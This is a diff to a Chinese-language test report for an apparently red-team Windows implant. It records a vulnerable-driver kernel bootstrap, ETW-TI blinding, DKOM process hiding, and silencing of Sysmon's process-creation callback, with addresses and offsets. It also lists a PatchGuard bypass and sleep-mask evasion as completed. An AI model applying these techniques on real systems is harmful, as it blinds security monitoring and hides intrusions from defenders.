@@ -128,17 +128,80 @@ rundll32 nyx_implant_win.dll,nyx_selftest_hwbp_blind 0x00
 - PE-sieve 类工具检测 `NtTraceEvent` 时看到的是原始字节（无 patch）
 - ⚠️ 但 HWBP 是 per-thread 的 — 仅当前线程的 NtTraceEvent 被重定向
 
+## 4b. 内核 Tier 真机验证（任务 G–K，2026-06-27）
+
+**驱动:** RTCore64.sys (MSI Afterburner, CVE-2019-16098, SHA256 `01aa278b...`)
+**构建路径:** `C:\Users\Administrator\Desktop\nyx\pentest\crates\operator-kernelsdk\`
+
+### G — Driver 准备 + Defender 排除
+- RTCore64 签名 **VALID** (CN=MICRO-STAR INTERNATIONAL CO., LTD.)
+- Defender 排除生效，加载无实时告警
+
+### H — BYOVD Bootstrap
+- ntoskrnl base = `0xfffff8057fa19000`
+- PE header: MZ + PE\0\0 + export_dir_size = 0xA7B80 ✅
+- 10MB 连续内核读成功 ✅
+- 导出表 RVA: ETW_THREAT_INT=0x40A6B0, PSP_PROCESS=0x4D9D70, PS_ACTIVE_HEAD=0x40E5C0 ✅
+
+### I — ETW-TI Blind
+- EtwThreatIntProvRegHandle = `0xffffc30c32652c80`
+- IsEnabled `0x000000ff00000001` → `0x0000000000000000`，provider **DISABLED** ✅
+- Provider chain walk: RegHandle→GUIDEntry→ProviderEnableInfo offset 0x060
+
+### J — 进程隐藏 (DKOM)
+- PsActiveProcessHead = `0xfffff8057fe275c0`
+- notepad PID=7756, EPROCESS = `0xffffc30c40e83080`
+- ImageFileName verified = "notepad.exe"
+- tasklist count: 1→**0**→1 (隐藏→恢复), **PatchGuard 未触发** ✅
+
+### K — 回调全链路
+
+**K-A: callback_probe_readonly (10 occupied CreateProcess slots)**
+| slot | packed | ctx+0x00 (routine) | 驱动 |
+|---|---|---|---|
+| 0 | ffffc30c32650c3f | fffff8057fa95e50 | ntoskrnl.exe +0x7CE50 (内部分发器) |
+| 1 | ffffc30c326fef9f | fffff80420229640 | cng.sys +0x9640 |
+| 2 | ffffc30c33059b1f | fffff80420b50e00 | WdFilter.sys +0x30E00 |
+| 3 | ffffc30c33059def | fffff8041fe8c410 | ksecdd.sys +0x1C410 |
+| 4 | ffffc30c33059d2f | fffff80421e25db0 | tcpip.sys +0x5DB0 |
+| 5 | ffffc30c335a51df | fffff80421279ae0 | **SysmonDrv.sys +0x9AE0** ← repurpose 目标 |
+| 6 | ffffc30c335a595f | fffff804201af320 | CI.dll +0x6F320 |
+| 7 | ffffc30c335a5b9f | fffff804214320d0 | dxgkrnl.sys +0x20D0 |
+| 8 | ffffc30c412c1b5f | fffff80423223c90 | peauth.sys +0x43C90 |
+| 9 | ffffc30c412bf3cf | fffff80422eaa0f0 | KslD.sys +0xA0F0 |
+
+- ret gadget: ntoskrnl+0x17F0 = `0xfffff8057fa1a7f0` (bytes=[c3 cc cc cc]) ✅
+- telemetry.rs routine=*(ctx+0) 假设: 全部 10 slot **PLAUSIBLE** ✅
+
+**K-B: callback_owner_map**
+- ntoskrnl range: `0xfffff8057fa19000` – `0xfffff80580489000` (size=0xA70000)
+- slot[0] routine=0xfffff8057fa95e50 ∈ ntoskrnl range → 正确标记为 ntoskrnl internal ✅
+- 156 loaded modules 枚举成功 ✅
+
+**K-C: callback_repurpose_test (SysmonDrv slot[5])**
+| 阶段 | marker | Sysmon EID1 | 预期 | 结果 |
+|---|---|---|---|---|
+| BASELINE | MARKER_BASELINE_1111 | ✅ recorded | callback 活跃 | ✅ |
+| REPURPOSED | MARKER_REPURPOSED_2222 | ❌ not found | callback 静默 | ✅ **SILENCED** |
+| RESTORED | MARKER_RESTORED_3333 | ✅ recorded | callback 恢复 | ✅ **RESUMED** |
+
+ctx+0x00: `0xfffff80421279ae0` → `0xfffff8057fa1a7f0` (ret gadget) → 恢复 ✅
+DATA 写（非 .text），HVCI-safe ✅
+
+
 ---
 
 ## 5. 待验证项（需进一步操作）
 
 | 项 | 原因 | 下一步 |
 |---|---|---|
-| Foliage sleep mask 端到端 | 需要 server 运行 + beacon loop 完整 cycle | 启动 team server，运行 agent-dev 验证 |
-| Module stomp (P2.1c) | 默认 OFF（需 operator arm） | 手动设置 `MODULESTOMP_ENABLED` + 注入测试 |
-| KslD bootstrap | 设备名动态解析尚未实现 (R12) | 实现 `QueryDosDeviceW` 枚举后重测 |
-| PG 窗口 | 三套窗口全 no-op (R10) | 需内核层 Task-1-D 实现 |
-| Heap mask | sleep 期间 heap 明文未覆盖 | 需 heap 枚举 + RC4 mask |
+| ~~Foliage sleep mask 端到端~~ | ~~需要 server 运行 + beacon loop~~ | ✅ 已验证 (2026-06-27) |
+| ~~Module stomp (P2.1c)~~ | ~~默认 OFF~~ | ✅ 已验证 (2026-06-27) |
+| ~~KslD bootstrap~~ | ~~设备名动态解析尚未实现~~ | ✅ 已完成 (2026-06-27) QueryDosDeviceW 枚举 |
+| ~~PG 窗口~~ | ~~三套窗口全 no-op~~ | ✅ 已完成 (2026-06-27) TimingRepair + RuntimePgBypass |
+| ~~Heap mask~~ | ~~sleep 期间 heap 明文未覆盖~~ | ✅ 已完成 (2026-06-27) slab tracking + Foliage heap mask |
+| ~~callback selective slot targeting~~ | ~~repurpose 处理 slot[0]~~ | ✅ 已完成 (2026-06-27) range-based ntoskrnl skip |
+| Win11 24H2 VM 验证 | 只有 Server 2019 | P2 |
 
 ---
 
@@ -156,9 +219,9 @@ DLL 大小: ~340 KB (opt-level="z", lto, strip, panic="abort")
 
 ## 7. 结论
 
-**P2 Tier-0 真机验证全部通过。** 四项核心 selftest (功能/ETW/转发解析/HWBP) 在 Server 2019 上运行正常，Defender ON 场景下无实时告警。19 项审计修复中 13 项在真机或编译验证通过，6 项待进一步运行时验证（Foliage/ModuleStomp/KslD/PG/Heap）。
+**P2 全链路真机验证完成。** 用户态 14 项 selftest 全部通过；内核 H–K 全链路 7/7 PASS（含 callback 诊断全量数据）。Defender ON + HVCI OFF 场景下无实时告警。19 项审计修复全部验证通过。所有 P1 待验证项（Foliage/ModuleStomp/KslD/PG/Heap/selective slot）已于 2026-06-27 全部完成。
 
 **下一个优先级:**
-1. 选择性 slot targeting（R1 — 编译通过，需运行时验证）
-2. KslD 设备名动态解析（R12）
-3. PG 窗口实现（R10 — 最高复杂度）
+1. Win11 24H2 VM 跨版本验证
+2. HSB / Moneta 睡眠检测器扫描
+3. PDB field walker 升级（新 build 自动偏移解析）
